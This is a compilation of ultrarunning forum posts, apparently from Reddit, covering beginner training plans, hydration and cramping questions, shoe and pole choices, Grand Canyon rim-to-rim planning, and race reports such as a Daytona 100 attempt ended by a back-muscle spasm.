Who am I? An overweight, overworked 46-year-old. I run slowly. For the last year I have been around the 60-65km/week mark, and it's going to be pretty difficult to get beyond that, for reasons of time. My goal is 'just to finish.' My longest run so far was a 45km, 1800m+ 'Maraton de Montaña' (Mountain Marathon events in Spain tend to be anywhere between 40-45km, and to a have 1500m or more vert). I finished but very much at the back of the pack, like 95th out of 100 or something, in 6:57, partly because I started to get awful calf cramps after about 25km.

So what's the plan? That's what I'm here for! At the moment I'm vaguely following a 50km plan, building up to a self-supported, relatively flat/downhill 50km run I have planned for May 2 or 3. I say vaguely because time, family and social commitments, periodic drops in energy levels. i think I'll keep working on that until May even if I do get a place, and then rejig from May. So that will be June, July, August and September to build to the event. I know that I need to do strength work, and lots of hills in training to minimise the likeliehood of getting cramps again.

Advice/Anecdotes Water Strategy,"I'm running my first longish trail race (trail marathon) soon - I know, not an ultra, but figure you all probably have the experience I'm looking for. Should preface that I'm a beginner/slower runner, so not planning to win or anything but hoping for an overall smooth and fun experience. 

I have a salomon adv skin 12 hydration pack and for my longer training runs (18 miles +) I've been using a 1.5 liter bladder + the two bottles in front. 

The race has aid stations/water stops every 7ish miles. My initial thought was to just wear the vest with the 2 bottles (no bladder) and refill fairly often. However, if I do my usual set-up of bladder + bottles, I can probably make it to the last station at mile 20 before I will need to refill (would only refill bottles, definitely not trying to fuss with that bladder out there). 

Basically weighing these 2 options:

1. Bladder + bottles: somewhat heavier to start but will require fewer stops to refill and can just grab snacks and go
2. Only bottles: lighter but will need to stop and refill more often, potentially wait in line/shove bottles back into vest, etc.

Obviously a fairly small and nitpicky question but wondering if others have thoughts or experience they could share.

Maybe that doesn't make sense but in shorter distance prep it's not uncommon to overshoot. For example, run 15ks in preparation for a 10k.

In 1875, Daniel O’Leary, an Irish-American from Chicago, Illinois, emerged as a great ultrarunner (pedestrian) who sought to be the champion of the world. He proved that an Irishman could walk 500 miles in close to six days. Others wanted a piece of that action and a six-day 500-mile fraud fooled thousands in Massachusetts but was caught.

R2R2R concern - want opinions,"So I have a R2R2R trip planned with some running buddies in April.  Been planning/training since late last summer.  Not concerned about making the distance/climb.  What I have figured out recently is that, while I knew I was the slowest of the group, I am a whole lot slower than the rest of the group.  Like 3.5 minutes plus per mile slower.  For reference, in a group run a couple weeks ago I lost sight of them around the first mile and didn’t see anyone again until they sent someone to find me after they were all done.  

So my question: I’m thinking of backing out of the group because of the speed/time disparity.  At 3.5 minutes per mile, I’ll be 2.5 hours slower than the rest of the group.  I really don’t want them all finished ready to go shower, eat, and relax, and having to wait so long on me.  I could care less about being on my own, do most of my long runs in the mountains solo.  

I know if I try and talk with them about it, they will tell me it doesn’t matter, they’ll support me, etc, but it’s a lot different now than after they’ve spent 14 hours on the trail.  So I guess I’m looking for an un-biased opinion on whether being a part of this group is the right choice for this type of trip.

First time R2R2R planning — Help!,"I'm wanting to run R2R2R (starting and finishing at the North Rim) sometime this fall 2022 and have been hoping for around Thanksgiving, but I know water is usually shut off mid-October, and the North Rim ""closes"" around then as well. 

I'm wondering... Does the North Rim closure just mean shops and lodging is unavailable, or is it inaccessible period? I'd plan to drive down with a couple friends and camp at the rim to start the next day, so we don't need lodging or restaurants. Does this seem feasible in late November? 

Secondly (people who've done R2R or R2R2R in late fall) - is there ANY water supply at all, including filling up in the river itself, that late in the year? Or would I need to carry in ALL the water I need for the entire 50 mile day? Would there be water available at the South Rim (our mid-way point)? 

Just looking for general beta here, since I've never been and it's so foreign to me. I'm running my first 100 miler in June, so my rough plan was to run one more bigger race over Labor Day weekend, then relax until around Thanksgiving to do R2R2R. But if it makes way more sense to do R2R2R earlier in the year (say, end of September or early October), I'd do that too. I'm also open to starting at the South Rim instead, but I'm coming down from Montana, so I figured it'd save lots of drive time to just start and finish at the North Rim.

"Can firm shoes still have good cushioning? Please, help me understand.","Hi, I am a bit lost and need some help in understanding cushioning.

My shoes (ON cloudultra, 20-28mm stackheight) are almost everywhere described as very cushioned shoes, made for long distances. However, they feel quite firm and stable to me, not plush, and I actually like that feeling very much. (That is the reason why I have chosen these and not others, after trying many others as well.) I have no problem running longer distances (30k for example, still building up) with them, both on trail or road. Now, what I am wondering or confused about is, how can these be cushion shoes while they feel rather firm? Or is there something like ideal cushioning for shorter distances (softer) and ideal cushioning for longer distances (firmer)? Similar like a seat feeling very comfy initially, but not after prolonged use, while a harder seat might feel less comfortable initially but remains more comfortable for longer sittings? Or is all just marketing lingo used to appeal and sell?

How do you think I would feel if would run a long distance in Hokas, or other super cushioned shoes. Would I feel even better or less fatigued? Anybody who made that switch?

So far I always went by feel, ending up with these firmer rides, and I never got injured and enjoyed all my runs and shoes. So there is no real need to change type of shoes. I guess I am just wondering, ... could it be that the grass is even greener on the other side?

This is not as scientific or concise as a u/runner52494__2 but I got some words down whilst sitting in an airport yesterday so here it goes.

The race began in the rainy fog. I started in my lightest shell intending to drop it at mile ten when I saw my crew. I must immediately thank Ann and Bill Brady for being the most wonderful support crew I could ask for. The plan we came up with was to exchange my vests every ten miles, each time holding the same nutrition. I did one bottle of Tailwind, one bottle of water and three gels. I also had four gels in my shorts throughout the race. I took in one gel every 20-30 minutes plus drinking 200 calories or so of sports drink. In the second half of the race I mixed in pretzels, Pringles and pickles. This worked well enough and I only needed an extra bottle of water once which was a relatively quick stop at the aid station.   
I chatted with a few runners leapfrogging with some of them but mostly staying with a group of six people in the first 20 miles. After mile 20 I ran with a woman named Meg (F4) for an hour or so eventually getting separated a bit before the 50k mark.

About a mile before the halfway point is when Leah Yingling (F3), caught and passed me with relative ease telling me how far ahead Maryann (F1) was. To be completely honest I thought I was much further back than that and hadn’t thought much about placement at that point. Approaching the 50k aid station, I knew I needed to change my shoes. The mud from the framing conditions had caked about 10 extra pounds onto my shoes and I was over carrying that. I switched into another pair of the Saucony MadRiver (my preferred shoe) and thankfully the trails had dried out for the second half. Taking this time was a gamechanger even though Leah put some minutes on me. I still wasn’t very focused on catching or being caught, but taking care of myself and running my own race. At one point Leah had 15 minutes on me, but I didn’t know so I wasn’t too worried about it. A went through a low right after 50k but it was nutrition related, so eating some baby food pouches picked my mood right back up. Seeing this part of the course in daylight was kind of neat! The foliage is so different from Upstate NY as was the trails. Very rocky yet runnable. I loved seeing the cactuses but they didn’t exactly love me back. I have a fair bit of Texan tattoos on my arms and legs. In fact, the blood on my knees are not from my knees…it’s from the scratches on my thighs dribbling down my legs all day. I think it’s beautiful.

Making my way around the second 50k loop wasn’t as slow going as I had imagined. Because my only other 100k experience was from Virgil Crest, which had much more distinct elevation, I figured I would walk a lot of the hills I ran up in the first half. This was not the case. I actually only walked twice on the same very steep descent about two miles from the finish, which is where Leah caught me in the first loop. I got to the last vest switch aid station with about ten miles to go. Ann (my crew) told me Leah and her pacer had left about a minute earlier asking about how far back I was. At this point I figured that if I was 15 minutes back at one point and was now only a minute back, I should simply continue the pace I was running at and I should catch her. I was also feeling like I had run over 50 miles at that point, so I wanted to be cautious with speeding up. About two miles later I saw them crest a hill expanse ahead of me. I still did not speed up but waited until I was close enough to pass decisively. I came into the last aid station about a minute ahead of her with less than five miles to go. Again I did not speed too much, I focused on what I needed to do, which was not give up and finish strong.

The last section was a rolling downhill so I took advantage of it and opened up. I knew I had that last hill climb to get over before I’d feel like I could speed up and burn my last match to finish. I increased my pace and told myself that this is what I’ve got and if she passed me then she deserved it. I simply focused on not giving up, on not leaving the pain cave until the race was done. I would not believe or focus on a golden ticket until I crossed under the arches.

Then, it was over. A man held up a large piece of paper that confirmed I had raced my way into the Super Bowl of ultrarunning. I cried a bit, hugged everyone and as I stated at the beginning of this post, am still in a state of wonder.

Advice and sanity check for first-timer,"30M here with basically no prior running event experience. I once ran a 5k with a friend like 5 years ago but thats about the extent of my experience with organized running events. Back over the summer one of my friends asked me if I would run an ultra with him this coming April 9th/10th ([100k race in GA](https://www.argeorgia.com/endurancehunter100Z)). While Ive never exactly been grotesquely out of shape in my life, I certainly havent been super active over the past few years and covid certainly didnt help this initially. However, back over the summer when he asked me, I started up a hal higdon marathon training schedule just to try to get to a point where I could actually run since I hadnt done basically any serious cardio training since college sports. I was up to about 40 mile weeks but then dropped off a bit over the holidays with traveling. Right now Im back down to about 25-30 miles a week but will ramp this back up over the next 4 weeks to get back to ~40 miles weeks. Im incorporating more strength training now as well as trying to train a bit more for elevation changes (where I live is very flat so this is mostly running nearby bridges or using a stair climber). I will also try to make a couple weekend trips between now and then up to a cabin in the Appalachian mountains that a relative has to train on some of the trails there. Another thought I had was just to try to go for a few runs/hikes where I dont worry about overall mileage but try to stay out there for 8-10 hrs or so to get my body more used to actually moving for long periods of times. My plan has always been just finish and I am currently trying to balance between pushing myself further to get to a better spot physically versus trying not injure myself since that would certainly put an end to it for this year. Ive been experimenting with some gear and food consumption while running on some of my longer runs to try to find out what works for me. My training experience so far has also helped me hone in on what I eat to try to maximize the nutritional value of my food. Overall I havent felt this good physically (and mentally) since college and while ive historically hated running and it was always ingrained as the ""punishment"" activity in sports, Ive finally found my enjoyment in it. However, I do also realize time is not my friend here and the run is quickly approaching. From anyone here experienced, do you have advice on the following: 

1. Given the allotted time, how realistic do you all think it is to finish?
2. Are there areas I should be focusing on or anything I should throw into my training regiment with the limited amount of time left?

Shot shoulders,"I am new to ultra running but I have been training for one ghat I “attempted” yesterday. I had originally planned on doing the 50k but only managed (barely) one loop and took a 25k finish (I know that’s not an ultra). 

Aside from all of the questions I have about the experience I want to know if it is common to have EXTREMELY sore shoulders? I ran with my water pack which was new. Could that have been a part of it?

60K Training Plan for high elevation and lots of climb (Standhope 60K),"Looking for suggestions for a training plan for the Standhope 60K.

I am looking to transition away from Zone 2 work and start building hill capability.  

Standhope is on July 21, and runs through the Idaho Pioneer mountains.  The course ranges from 7200 to 11,000 feet, and has 10k of climb, so its a tough, tough course.  

I have run some tough hills before (Pike's Peak half marathon, RONR 50K) but I have struggled with some piriformis issues and downhill speed.

who's over racing?,"cuz i am. 

i love running. i love running really far in the high country. i even like competing. 

but i'm over the racing scene, the costs, the hassle, the stress, waking up at 330am to go deal with parking and registration, the planning, PR's.

is anyone else at this point? right now, i'd rather go cruise through the mountains on a self supported 40miler over terrain i actually want to run just because its fun. picking the day i feel like running, instead of trying to time my peak and taper and all the other bs that goes into training just to have an off day or wake up and just not care about the race.

UTMB Qualifying Races 2022,"I'm trying to qualify for UTMB CCC. I want to run the race in 2023 or 2024 and having a hard time understanding how to enter the lottery. 

On the UTMB site describing the 2022 entry process it lists the requirement to get up to 8 points over 2 races to enter the lottery but when I go to search qualifying races in 2022 (here: [https://utmbmontblanc.com/en/page/17/qualifying-races.html](https://utmbmontblanc.com/en/page/17/qualifying-races.html)) then it doesn't tell me how many points each 2022 race is (see first photo). It just gives an icon telling me the race distance. The only lists the point value for races in 2020 or earlier (see second photo). Did the point system disappear for 2023 and 2024 entry to UTMB CCC? 

This lead me to believe that instead of points all races will be handing out stones instead? How do I see how many stones each race has? It was my impression that only UTMB world series races (very limited 30 races) gave out stones.

7 Weeks between Ultras?,"Hi All...

So I have a 50K in May which I'm training for, it's in the UK and very flat. Goal is to finish, and use it as a training run for the race I really want to run in July which has a bit more elevation in it.

The first 50K is a mixed road / light trail run with about 200m / 700ft of elevation change. I've already started training for this. The race day is 15th May.

The second 50K is mixed road, and some heavy trail with about 900m / 3000ft of elevation change. This race is on the 2nd July. 

The second race is July is one I want to run hard at, and do my hardest - not a simple finish &amp; learn. I won't win it by a mile, but want to feel I absolutely did the best I could have done. 

Question is - what to do in the 7 weeks between the two? I currently have the first week - ten days after May planned with some slow walks / swims and some very light exercises. But what should I do for the next five weeks? Go back to a couple of base building weeks (will they be needed?) and then a few taper weeks? 

Everthing I've read says you can just rest and then run another marathon in a few weeks...but with the 7 weeks i'm unsure what to do?

Thanks for all tips!",ultrarunning,1641664827

Am I ready for a 50 mile race?,"This might be an odd question but I’ll give context at where I’m at. 


Between Nov 2019 and June 2021 I was on programmes pretty relentlessly. I completed the following distances throughout this:

- Half Marathon Jan 2020
- Marathon April 2020
- Marathon April 2021
- 50K June 2021
 

Obviously many long runs incorporated into training. Following the 50k I needed a bit of a physical and mental break (was getting a lot of little injuries and just not enjoying my runs). Life has gotten in the way a bit so struggled to get back into a routine. June - July 2021 I didn’t run at all. September - November, highest weekly mileage probably, but quite inconsistent and generally anywhere between 15-25. For 3 weeks in December I haven’t really ran. My longest run over last 6 months has probably been a mere 7 miles. Although Since about September I’ve incorporated gym strength training 2-3 times a week. 


I’m not sure where this leaves me? Historically I’m in good stead but I’m worried the last 6 months may have caused a major drop off. There is a 50m in 7.5 months time. I think just finishing would be my objective (though my ego is saying push harder). I think I’d hit a program mid march, prior to that just getting my weekly mileage consistent to 30 miles a week 5 times a week. Do people think this is feasible or am I dreaming? 


PS I have also been on feminising HRT since June 2020 which has huuuugely impacted performance, stamina and injuries but I’m guessing that’s quite a niche thing for people to offer advice",ultrarunning,1641403369

How do you run slow?,"So I’ve finally learned that running slower on my long runs saves my body. I’m not a fast runner to begin with. I’ll average a 10min pace for a half. But that’s because I start out at 8:30-9min and end up around 11 to 12min pace, and my body is destroyed afterward, and I’m struggling at the end. Yesterday I tried to maintain a 10-10:30min pace through an 11 mile run and I felt great afterwards. It was hard not to start off hot, and I found myself repeatedly during the run going too fast. 

I find an 11-12min pace is quite boring and feels soooo slooooooow, but it’s probably what I have to do in order to finish my 50k without burning out and feeling horrible at the end.

From 0 to 100: Getting back into the ultra scene after injury,"Late April/early May I injured my knee (patella tendonitis) while training for the Never Summer 100k in State Forest State Park, CO. I took the following 7 months off of running to make sure I healed correctly (with the exception of very short runs before doing the Pikes Peak Ascent, which was 95% walking anyway). I've been keeping up fitness with cycling and lifting along the way.

Now, completely out of running shape, I'm dead set on finishing that 100k this year, which will be my first ever. My only goal with ultras is to have fun and to finish - I'm always happy to walk as much as I need. So, using a slow progressive overload and 80/20, I'm setting out to finish 3 races this year: the Quad Rock 50 miler (or 25, depending on how I feel) in May, the Yellowstone 50k in June, and the Never Summer 100k in July. 

Starting with just 10 miles a week, I plan to increase weekly mileage by 7.5% each week, with most of the gains on weekend long runs. This means that by week 17, just before the 50 miler, I will be doing about 31 miles. By week 27, I'll be doing 65 miles, giving one week to taper before the 100k. I'm continuing strength training 2-3 times a week and cycling especially for easy active recovery days to get some strain off the knee. 

I'm really excited for these next 7 months. Does anyone think that 7.5% is too much? Maybe even 5%? Maybe get rid of that rigid approach entirely and just go by feel? What other tips to help me succeed on my goals?",ultrarunning,1641135181

Question about incorporating stair workouts,"First ultramarathon coming up this summer (Buckin Hell 50k). There is a lot of elevation in this race, and my main concern is just finishing before the cut off. I'm averaging around 1000-1500m elevation gain per week during my trail runs, and hoping to raise that by a lot in the coming months. 

However, I'm thinking about improving my hiking abilities by having a dedicated workout each week (maybe multiple times) where I just hike up and down this trail that consists of 500 stairs. My plan is to go up and down these stairs for a bunch of reps, hoping to gain more time ascending and descending.  

I'm just wondering how I should think about how to fit this workout in during my weekly routines. Should it be counted as part of my easy mileage, so to speak, since I won't even be running? Or should I think of it like a gym session? Would you have a separate day for such a workout, or would you slot it in before /after a run on a single day? 

&amp;#x200B;

Also looking for general insight into stair workouts. If you've done this sort of thing, how much do you think it helped with trail ultramarathons with steep elevation? How often would you recommend doing such workouts? (and so on)

First ultra help,"Thinking about signing up, just finished running my first marathon, and have the possibility to start at a 50k run with about 2000m of climbing (6500 ft) and 2000m of descent 

Running about 30 Miles a week, but where I live it's super flat. 

First: I can't really relate if 2k elevation and decent is much or little for a distance of 50k? 

Second: therefore I'm also lost on how would training look accordingly, especially since I don't have hills/any real height gain at all. Just a gym with treadmills that you can adjust elevation and opportunity maybe to run in hilly terrain at most once a week. What would be an appropriate amount of total elevation to be gained in a 4month training?

How to train zones and pace?,"Beginner [f27] ran first marathon last May and it was amazing. Training for 50mi in April. Got my first garmin! Starting to learn more about training zones and if most of my training should be in 1-2, that means I need to slow down. But then my pace slows down. Then, my total training time is longer which would mean more effort, right? 

I'm just confused on how to keep heart rate and training zones low without sacrificing too much pace.

My example: I did 12 miles in 2 hours on the treadmill. It was tough because I've been super sore the past few days but not unbearable and I have another long one tomorrow. I did 56% Z5, 33% Z4, 10% Z3. Is this bad? I really didn't feel like I was going super sprint hard and my breathing was pretty controlled. After the first hour or so I threw in some walking as necessary. Do I need to slow down more? I'd love to complete the 50mi in 10.5-11hrs.",ultrarunning,1640315878

Across the Years, held in Arizona, is one of the oldest fixed-time ultras in the world, where you run as far as you can in a day or more. More than 2,300 ultrarunners have logged 450,000 miles at this race that was founded by Harold Sieglaff (1934-2015) in 1983. These were the first four runners who ran this run that first year at Washington High School in Phoenix. Learn who they are and how the race was started.

Naive to think Couch to 50k in 1 yr?,"I'll be turning 38 in Nov 2022, and have a pipe dream of doing an ultra before then (50k trail). I'm not quite ""couch"" as the subject suggests. I can go out and do a 3-5 mile run without stopping, averaging about 10-10:30 min miles. 

I have a plan in place to build up to a half marathon in mid-May, and was then going to do Hal Higdon's Novice 1 Marathon to run in mid September.

Does it seem feasible in the 2 months following the marathon to build up to a 50k trail run? I'm ok running/hiking it, but it seems like a good objective to work toward. I live in CO so can do some of my training runs on trail leading up. 

If feasible, any suggestions on how to bridge a road marathon to a 50k trail run in an eight week period?

I have run one looped ultra in Cliftons and one in Rincon 2s. They both went well.

Training Paces for a 100mi Race,"I've done some searching, but am having a hard time finding an answer to this specific question. Maybe I'm just looking in the wrong places! Anyway...

When training for a 100 miler, how much of your running is done at what you think will be target race pace? Do you mix that pace into mid-week easy runs, or do you target specific long runs to be at goal race pace? If the latter, how do you decide which long runs to target and how many?

I'm signing up for my first 100 so this is all new to me. I have no problem running my long runs @ 8-9min pace (with relatively little vert, so maybe 9-10min on more rolling or technical terrain). The race I'm signing up for is very runnable - &lt; 8000ft of vert and not very technical. I just don't want to keep plugging along doing long runs that are too fast to wind up being beneficial on race day. This training is very different than the road and track stuff I'm used to, so I want to make sure I'm approaching it right. Thanks in advance!",ultrarunning,1640129159

On one hand, it doesn't really matter, I didn't finish, but alternately -- I'm a little let down there's not even a record that I attempted this race, and for future runners - there's no indication of the percentage of DNFs of this race. It's a pretty tough race, and from my back of the napkin math, I think at least 50% of the starters did not finish this years race (conditions much worse this year than previous years).

Another 100 miles finish but not an easy one!,"This weekend the Bello Gallico 100M took place in Belgium. A 100 mile trail on relatively flat terrain. I already did a 100-mile race last May when it was warm and dry which had a lot of climb in it and I finished running up a hill with a big smile on my face and I only had one tiny blister. So I figured yeah this one is flat it will be a lot more easy. It turned out to become the hardest thing I ever did. I finished yes, but that's kind of a miracle by itself.

Frst of all it wasn't that flat. It actually had climb but the kind of climb where you can keep running which means you wear out your legs a lot faster. Then the weather: It wasn't very cold, around 3 degrees celcius during the night and around 7 during daytime but it was foggy as hell. So with my headlight on during the night it was hard to see anything because I was just illuminating the fog. And it was dark, so dark. I mean it's one of the shortest days of the year so we had like 16 hours of darkness and 8 hours of daylight, very depressing.

Then the terrain, we had a lot of rain this year. One of the most wet years in history so the terrain was really brutal. A lot of parts were ok but some were so muddy and slippery it was more like ice skating instead of running. You can see it in the pictures.

The trail consists of 2 rounds, one clockwise one counterclockwise. So you run a loop of 80K and then you run it again in the opposite direction. My goal was to try and finish it in 20 hours but if that failed I would def,. want to stay under 24 hours. 

I had a dream start and the first 80K was fairly easy. I did it in around 9.5 hours which was great and I was very confident to go out for the second loop. But this is where my preparation failed. I've noticed a lot of people changing shoes en socks from their dropbag. Well I had a dropbag but it only contained food that's it. So I ran with the same shoes en socks the entire race. My feet got wet and I could already feel the blisters on several places on my feet. I kept running until 130K, then it became so bad. I was struggling to maintain my pace. I had to walk a lot. I tried to run flat and downhill but at the checkpoint with 19K remaining the pain was so bad I wasn't even sure if I could make it to the finish line.

Anyway, I decided to go on and walked the rest of the way. It took me almost 4 hours to do the last 19K! I litteraly crawled to the finish line lol but I did finish under 24 hours, in exactly 23:23:31.

Then I said to myself. No way I will ever do this ever ever again. And now 2 days in, I'm like ah well we'll see about next year lol. People call me crazy, even a masogist. I'm injured now my feet were full of bloody blisters and my shins are even worse now, very painful. I'm probably done running for the next 2 weeks. Why is it that we just don't want to give up :)

The course has about a mile of a watery slushy snow mixture (before getting to 2 ft of compacted snow) and my drymax socks seemed fine once I got out of the ice baths, but I’m wondering if I would have been better off with wool.  
Lastly, I had rain pants on, which were fine given I spent 2/3 of the time grinding up the 2,000 &amp; 1.6 mile climb, so it wasn’t a huge issue - but I was thinking waterproof or warm tights might have been better.

First 100 miler,"Hi everyone! I (19F) am looking for advice on training for my first 100 mile race. My history with ultra-running is slightly a-typical so I'd welcome any advice or reality checks. 

Background: Over lockdown, I got very fit, lost weight and was running well but not over any particular distance. For multiple reasons I lost this motivation, gained some weight and stopped running over the winter of 2020. I decided impulsively to run a marathon for my 19th Birthday in March 2021 and trained for about 3 weeks from a base of nothing up to a height of 16 miles. It was very slow (about 5 hours) but I ran the marathon successfully and was completely fine afterwards (no pain, normal walking, could have run the next day). Ideally, this would have sparked me to train based on this success but I didn't, went traveling instead and gained a bit more weight. In a moment of madness I signed up for a 24 looped ultra in the summer of 2021 and had grand hopes of extensive training. However, as you can probably expect, I did not train at all (went on maybe 3 two mile runs over a couple of months) and I arrived at race day in September with literally no base of running fitness. I had planned to drop out but my uncle convinced me to give it a go and I unexpectedly managed to run 55 miles without too much physical struggle. As with the marathon I had little to no pain afterward and no injuries. The extent of it was losing a toenail and a day of mild muscle stiffness. My main problem was taking too long breaks- if took it too cautiously because I didn't expect to do anything, wore the wrong kit and physically could have run a further distance. 

Obviously these are slightly reckless behaviors but I genuinely have suffered no ill effects as a result. There's always the worry of future problems but both my dad and my uncle are long-distance runners so I hope I have a bit of a genetic protection. Anyway, I've signed up for the same race (this time scheduled to take place in June 2022) with the hopes of improving my distance (I would be very happy with 80+ miles but 100 is of course the elusive goal). I hope and believe that 6 months of training could get me there but am unsure how to create a training plan that is both a beginners plan (as I'm not running currently) and reflects the tiny bit of experience I have.

"I have to pee a lot while running (so I should drink less), but I also always end up with cramps (so I should drink more?). Does anybody have tips?","For starters: during normal life I have to pee very often. But when running it is bothering me: I have a feeling that I pee out everything I drink during an ultra. I am also an average sweater, so that means I will get dehydrated over time. Every time I pee, it is very clear, which would indicate I am over-hydrated and I can drink less. 

The problem is: I always have cramps when doing longer efforts. I know the biggest cause for cramps is just lack of training, but even during not-over-my-limit efforts I start cramping up. Another cause for cramps is obviously de-hydration. I usually drink on average 500ml (16oz) to 750ml (24oz) an hour (depending on the weather etc) with Tailwind powder. From what I can find online, this way I have the advised intake of sodium per hour (+/- 200mg/hour).

Daytona 100 race report followup about injury and resolution,"Hey all; 

I don't know about you all, but I always like to read resolutions to issues people have during the race. It adds to what might go wrong and what can I do about it if I ever face the same issue.

Summary from my race report; started leaning severely to the left after about 30 miles during the Daytona 100. Had to drop after 100K due to it. Everything else was going good. Never had this issue before. 

I went to my PT, who is a freaking miracle worker, she asked a load of questions, I showed her the vid of me leaning, she did a number of strength, stability tests.  

So she says; ""I have a pretty good idea of what the issue is, ready to feel it?"" I say sure.

She proceeds to work the area and hits the exact spots that are the issue. So, yeah that's it!

It's the quadratus lumborum muscle, it connects to the ribs, spine and pelvis. She says not only can she feel it very tight, she can see it. She suspects the spasms were so bad and I limped along on it so long it has micro tears, so she will 1st rehab it and then strengthen it. 

It ""leaned"" me due to the connections with the top, ribs, and bottom, pelvis, and the muscle spasming so severely. 

She worked the area for awhile, I did about 5 stretching exercises for the specific area and heat, electrical stim. 

I asked could I have done anything at all to relieve it during the race, she said probably not, once it got that bad it had to be rested.

So there you have it, a mystery solved and hopefully resolved. 

Besides from a little pain from that area when I run, I'm feeling great and back to base getting ready to ramp back up for the Keys 100.",ultrarunning,1639586366

Cramping or Muscle “weakness”,"So, I’ve done a handful of ultras, 50+ miles. I’ve run into the issue of either my legs cramping or “blowing up”…

Example 1: drank 500 ml of Hammer Heed between aid stations. With gu’s containing electrolytes. Taking salt pills every hour… I was being good if not over zealous. Around mile 22-25 my quad on the inside of my knees start “cramping”, my inner leg as well. I could stretch some of them out… but was surprised because of the amount of Electrolytes I was taking in. 

QUESTION: is this probably electrolytes issue or a strength issue?

TLDR: am I not getting enough electrolytes or am  I know doing enough strength training to prevent cramping on races/runs over 25 miles?",ultrarunning,1639445224

Finished my first 50 miler!!,"Well, I did it! It was fucking hard! I did my first 50k (my first race ever) back in June, it was painful but fun. Did it in 6 hours, it was pretty hilly and overall just hard for my first serious effort. Spent the rest of the summer running casually, lifting, and climbing then I signed up for my first 50 in late September. The race was in south AZ on the AZ trail, and I'm from WA so the terrain and climate was drastically different. It was rocky, hilly, warm, and the altitude played a bigger part than I was expecting. Miles 1-30 were easy breezy, but 30-43 were excruciating and brought me to a dark place mentally. But I challenged the voice of self doubt and reminded myself that the pain was temporary and kept chugging along. The sun set at mile 45, so I spent the last hour or so in the pitch dark, trying to run downhill over rocky terrain. Still fought through it and drug my half dead corpse over the finish line. It took me over 12 hours, but quite a few runners DNF'd so I'm just proud of myself for finishing. I ran it with my dad the whole way through (He's 52, I'm 20F). Nothing miraculous or wildly impressive, but I'm just proud of us for fighting through it and finishing it!  My next plan is to do another 50k in WA in late February to gain more confidence and see if I can run it a little quicker. Happy running! &lt;3",ultrarunning,1639408978

How to prepare for an Ultra in half a year,"I want to run an Ultra in June next year, so around 6 months of preparation. This race is 54km with 2000m of elevation gain.

I (31m) am not starting from zero with running, but my running experience is mostly in the shorter distances. The longest I have run yet is a half marathon, and although I run for many years, my training was never structured and pretty on and off. I have followed training plans, and had okayish results in some races with 19:19 in a 5K being my best time, but back then I was in better shape, nowadays I'd probably be around 22/23 minutes. Highest weekly mileage was around 50K.

My question is, is it possible to prepare for an Ultra in six months, and if yes, what should I focus on?

I live in a hilly area, so I get a lot of elevation gain in my runs anyway. However, most of my current runs are between 9 and 15km only, and only consistently get in one or two runs per week. I work and have two small kids, so shoveling time free for training is definitely an issue. It's rather simple to get a good hour in after the kids are asleep, but everything that is over two hours would be more complicated to fit into my schedule and could only be an occasional key workout.

What should be my goal training distances for long runs? What would you consider to be a minimum weekly mileage for that? Should I train how to eat and get calories in? How long should be my longest training run? What should be my focus?",ultrarunning,1639336338

Choosing pole length?,"I recently took the leap and bought poles to use in my upcoming ultras (BD Distance Carbon Z). I got the 110cm ones, based on my height of 5'6"", but they feel too short in use. I know if you plan to use them for more uphill, shorter is better, and if they're for downhill support, going longer is best. I plan to use mine mostly for uphill propulsion, and for support as I chug along flats when I'm dead. I've used them a couple times, on varying terrain (mostly using them on the uphill) and just can't shake the feeling that they aren't tall enough for the ""hanging from them"" kind of support I intend to use them for, but maybe I'm just wrong.... I know it's easy to say ""If they feel too short then just buy longer"" but I dont want to get some that are too tall because I'm mistaken about how they should feel.

Do any of you find that you want poles a bit longer than suggested based on your height? Experience with pole length for ultra running?",ultrarunning,1639259706
Achilles tendinitis flare up,"I’ve been experiencing Achilles pain after runs, not during. I had Achilles tendinitis about 6 years ago, and I haven’t experienced it in the last 5 years.

| B | Complete 100K | *Yes* |
| C | Complete 100 miles | *No* |



### Training

My goal race is the Keys 100 in May 2022, my plan was to do the Daytona 50 mile as my major training run, take off 2 weeks then kick into training for the Keys. 

I've followed the ultraladies.com 50 mile plan for the 22 weeks prior to the race. Working on my nutrition, hydration, etc. I went into it with a good base of 35 miles per week. 

I completed all the training with the exception of the last long run week due to an ankle issue, which I thought would be my greatest issue, turned out it was not that at all.

My taper was a week longer than I wanted, 3 weeks instead of 2 based on that ankle issue, I don't feel that was an issue in the end.

I changed from the 50 miler to the 100 based on how I felt, the weather at Daytona was perfect and I felt as long as I got 50 miles in the rest was bonus.

My wife and brother-in-law were crewing me. 



### Pre-race

Did a shake out run the day before and had the privilege to run with “UltraPam” who took the time to give me such fantastic advice and had great stories. Run went well. 

Met a bunch of online friends and just enjoyed the company. 

We had a rental around 2 miles from the 6AM start. Had a nice dinner of pasta and seafood and was in bed around 9:30.

My sleeping had been terrible and if I got 2 hours of sleep before the 4:30am alarm, that would have been a lot. 

I had all my gear ready and laid out; Salomon adv5 pack, drymax socks, Brooks Glycerin shoes, Path projects shorts and liner and Patagonia trail top.




### Race


My plan; 13:30 mpm running, 15:00 mpm walking, 10 minutes run/3 minutes walk.

Every top of the hour and bottom of the hour Huma (100 calories) and water, every :15 and :45 Tailwind Cola (100 calories) for a total of around 300 calories pre hour. 

Real food interspersed. Salted potatoes, PBJ, soup/broth, etc. But keeping to less than 300 calories per hour, I'm pretty comfortable with that. Scaps hourly.


### Miles 1 – 30

Just to make it easier I'm going to break the race into 2 parts, the 1st 30 and the last 30+.

Went out nice and easy, feel into a nice groove, chatting with people, just relaxing. I felt good, waiting for that dang ankle to scream at me, never happened.

I was eating and drinking on schedule, plenty of port-o-potties. 

Met me crew no problem, I had another vest that my wife would have filled and ready. I was tryung to keep the 1st 50 miles of crew/aid to a minimum. 

All was well, until......


### Miles 30 – 62

I get a bit lost trying to get over the Bridge of Lions in St. Augustine. I didn't have my phone, my wife was charging it and only had my Apple watch to communicate, so I get back on track and my bro-in-law starts pacing with me a bit.


He takes a video of me and says “Hey, hey you know your leaning a bit to the left”. I'm wait what?

I realize I'm starting to lean to the left? Never happened to be before, I mean never.

OK, so I start working standing straighter, no dice. So, for 30 miles its getting worse and worse and worse. I not only can't straighten up, its getting more and more painful with every step. I've had kidney stones a few times and they are my gold standard of pain, this pain was getting as close as anything ever got.

A crew member who ran UTMB ran over at one point and said she had some issue like I was having and it was electrolytes, so I downed some extra S-Caps and had an electrolyte replacement drink, nothing. I was not sweating bad and was keeping up on my electrolyte's. 

